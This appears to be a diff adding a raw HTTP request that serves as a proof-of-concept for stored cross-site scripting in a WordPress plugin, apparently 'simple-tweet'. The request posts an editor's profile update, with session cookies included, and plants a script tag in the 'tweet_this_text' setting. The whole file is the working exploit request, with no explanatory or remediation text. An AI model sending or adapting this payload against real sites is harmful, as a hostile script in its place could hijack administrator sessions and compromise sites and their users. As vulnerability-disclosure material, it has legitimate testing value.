@@ -1,0 +1,12 @@
+POST /wp-admin/profile.php HTTP/1.1
+Host: example.com:10003
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Referer: http://example.com:10003/wp-admin/profile.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: wordpress_7f1e0e8dff8818d1c2f579415daff8c7=editor%7C1703441991%7CFdMSAPnbMHPzRtA0uvMse9ab9ebe89a537de365332c389fd492709627215; wp-settings-time-7=1703267407; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_7f1e0e8dff881879415daff8c7=editor%7C1703441991%7CFdMStA0uvMsFqiV7nB%7Cbdb936a4ecc97866be2461eac4fc949a44d422005; wp-settings-time-2=1703269193
+Connection: close
+
+_wpnonce=4c9c89b6e3&_wp_http_referer=%2Fwp-admin%2Fprofile.php%3Fupdated%3D1&from=profile&checkuser_id=2&color-nonce=3b8a957c3b&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=editor&display_name=editor&email=editor%40gmail.com&url=&description=&pass1=&pass2=&new_application_password_name=&tweet_text=blogged%3A+%25POST_TITLE%25+-+%25POST_EXCERPT%25&shorten=on&bitly_name=&bitly_api=&jmp_name=&jmp_api=&shortlink=tinyurl&other_tinyurl_url=&separator=+&add_content=on&tweet_this_link=RT+%40%25TWITTER_ID%25%3A+%25POST_TITLE%25+-+%25SITE_NAME%25+%25PERMALINK%25&tweet_this_text=%3Cimg+src%3D%22http%3A%2F%2Flocalhost%3A10009%2Fwp-content%2Fplugins%2Fsimple-tweet%2Fimg%2Ftweet.gif%22+title%3D%22Tweet+this%21%22+alt%3D%22Tweet+this%21%22+%2F%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3ETweet+this%21+&action=update&user_id=2&submit=Update+Profile
